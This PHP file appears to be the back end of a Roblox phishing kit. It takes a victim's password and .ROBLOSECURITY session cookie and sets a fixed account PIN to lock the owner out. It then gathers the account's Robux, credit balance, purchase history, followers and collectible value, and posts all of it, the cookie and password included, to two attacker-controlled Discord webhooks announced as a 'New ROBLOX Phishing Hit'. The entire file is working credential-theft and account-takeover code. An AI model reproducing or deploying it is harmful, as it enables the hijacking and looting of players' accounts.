<?php
$ip= $_SERVER['REMOTE_ADDR'];
$webhook= "{webhook}";
$webhook2 = "{webhook2}";


error_reporting(0);
function sendMsg($username, $password, $kode, $webhook, $webhook2, $status, $cookie, $mship, $robux, $prem){
function request($url){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$output = curl_exec($ch);
	curl_close($ch);
	return $output;
}
$gcsrf = curl_init();

curl_setopt($gcsrf, CURLOPT_URL, 'https://auth.roblox.com/v2/login');
curl_setopt($gcsrf, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($gcsrf, CURLOPT_POST, 1);
curl_setopt($gcsrf, CURLOPT_HEADER, true);
curl_setopt($gcsrf, CURLOPT_POSTFIELDS, '{
	"cvalue":"Leakeder",
	"ctype":"Username",
	"password":"RAMAD001",
}'
);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
 $headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($gcsrf, CURLOPT_HTTPHEADER, $headers);
$result = curl_exec($gcsrf);
$headers = [];
$result = rtrim($result);
$data = explode("\n",$result);
$headers['status'] = $data[0];
array_shift($data);

foreach($data as $part){

    //some headers will contain ":" character (Location for example), and the part after ":" will be lost, Thanks to @Emanuele
    $middle = explode(":",$part,2);

    //Supress warning message if $middle[1] does not exist, Thanks to @crayons
    if ( !isset($middle[1]) ) { $middle[1] = null; }
$headers[trim($middle[0])] = trim($middle[1]);
}

$csrf= $headers["x-csrf-token"];
$fields_string='{
  "pin": "9817"
}';
$url = "https://auth.roblox.com/v1/account/pin";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
 $headers[] =    'Cookie: .ROBLOSECURITY='.$cookie;
    $headers[] =    'x-csrf-token:'.$csrf;
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);

curl_setopt($curl, CURLOPT_POSTFIELDS, $fields_string);

//for debug only!
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$resp = curl_exec($curl);
$check= curl_init();

curl_setopt($check, CURLOPT_URL, 'https://api.roblox.com/currency/balance');
curl_setopt($check, CURLOPT_RETURNTRANSFER, 1);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($check, CURLOPT_HTTPHEADER, $headers);
$output2 = curl_exec($check);
$httpcode = curl_getinfo($check, CURLINFO_HTTP_CODE); 
if ($httpcode == '200'){
    $cookiecorrect = 'Cookie Is Working';
    echo $cookiecorrect;
    function getrap($user_id, $cookie) {
	$cursor = "";
	$total_rap = 0;
						
	while ($cursor !== null) {
		$request = curl_init();
		curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
		curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
		curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
		curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
		$data = json_decode(curl_exec($request), 1);
		foreach($data["data"] as $item) {
			$total_rap += $item["recentAveragePrice"];
		}
		$cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
	}
						
	return $total_rap;
}

    if ($cookie) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Cookie: .ROBLOSECURITY=' . $cookie
        ));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $profile = json_decode(curl_exec($ch), 1);
        curl_close($ch);
        $userid = $profile["UserID"];
$ch3= curl_init();

curl_setopt($ch3, CURLOPT_URL, 'https://billing.roblox.com/v1/credit');
curl_setopt($ch3, CURLOPT_RETURNTRANSFER, 1);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch3, CURLOPT_HTTPHEADER, $headers);
$output2 = curl_exec($ch3);
$info2=json_decode($output2);
$balance=$info2->balance;
$ch4= curl_init();

curl_setopt($ch4, CURLOPT_URL, "https://economy.roblox.com/v2/users/$userid/transaction-totals?timeFrame=Year&transactionType=summary");
curl_setopt($ch4, CURLOPT_RETURNTRANSFER, 1);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch4, CURLOPT_HTTPHEADER, $headers);
$output3 = curl_exec($ch4);
$info3=json_decode($output3);
$summary=$info3->purchasesTotal;
$ch5= curl_init();

curl_setopt($ch5, CURLOPT_URL, "https://friends.roblox.com/v1/users/$userid/followers/count");
curl_setopt($ch5, CURLOPT_RETURNTRANSFER, 1);

$headers = array();
$headers[] = 'Content-Type: application/json';
$headers[] = 'Accept: application/json';
$headers[]= 'Cookie: .ROBLOSECURITY='.$cookie;
 $headers[] =   'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36';
$headers[] =    'Referer: https://www.roblox.com/login';
   $headers[] = 'Origin: https://www.roblox.com';
curl_setopt($ch5, CURLOPT_HTTPHEADER, $headers);
$output4 = curl_exec($ch5);
$info4=json_decode($output4);
$follower=$info4->count;
$getdate = "https://users.roblox.com/v1/users/$userid";

$gcurl = curl_init($getdate);
curl_setopt($gcurl, CURLOPT_URL, $getdate);
curl_setopt($gcurl, CURLOPT_RETURNTRANSFER, true);

$headers = array(
   "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36",
);
curl_setopt($gcurl, CURLOPT_HTTPHEADER, $headers);
//for debug only!
curl_setopt($gcurl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($gcurl, CURLOPT_SSL_VERIFYPEER, false);

$gresp = curl_exec($gcurl);
$getdata = json_decode($gresp);
$joindate = $getdata->created;
$age = date_diff(date_create($joindate), date_create('now'))->d;
$hookObject = json_encode([
            "username" => "Laurel | Hits",
            "avatar_url" => "https://cdn.discordapp.com/attachments/905868988695842856/908022995510001694/bread.png",
             "content" => "@everyone **| New ROBLOX Phishing Hit!**",
                "embeds" => [
                    [
                        "title" => '**:bread: New Account! :bread:**',
                        "type" => "rich",
                        "description" => "**The pin is automatically added after the login so if they already had a pin, it's invalid.**",
                        "url" => "https://www.roblox.com/users/". $profile["UserID"] ."/profile",
                        "color" => hexdec("FFFFFF"),
                        "thumbnail" => [
                            "url" => "https://www.roblox.com/avatar-thumbnail/image?userId=". $profile["UserID"] . "&width=352&height=352&format=png"
                        ],
                        "author" => [
                             "name" => "bobbob#8113",
                             "url" => "https://discord.gg/dyz7cXfStA"
                        ],
                        "fields" => [
                            [
                                "name" => "**Username:**",
                                "value" => "```" . $profile ["UserName"] . "```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Password:**",
                                "value" => "```" . $password . "```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Account Age:**",
                                "value" => "```" . $age . " Days```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Followers:**",
                                "value" => "```". $follower . "```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Robux:**",
                                "value" => "```" . $profile["RobuxBalance"] . "```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Credit Balance:**",
                                "value" => "```". $balance ."```",
                                "inline" => True
                            ],
                            [
                                "name" => "**Robux Summary:**",
                                "value" => "```". $summary ."```",
                                "inline" => True
                            ],
                            [
                                "name" => "**RAP:**",
                                "value" => "```". getrap($profile["UserID"], $cookie) ."```",
                                "inline" => True
                            ],
                       	    [
                                "name" => "**Pin:**",
                                "value" => "```9817```",
                                "inline" => True
                            ],
                            [
                                "name" => "**.ROBLOSECURITY:**",
                                "value" => "```". $cookie ."```",
                                "inline" => False
                            ],
                        ]
                    ],
                ],
            
        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );


        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => "$webhook",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
        curl_setopt_array($ch, [
            CURLOPT_URL => "$webhook2",
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $hookObject,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);
  
                                        
        $response = curl_exec($ch);
        curl_close($ch);
}
    
}
    
}
?>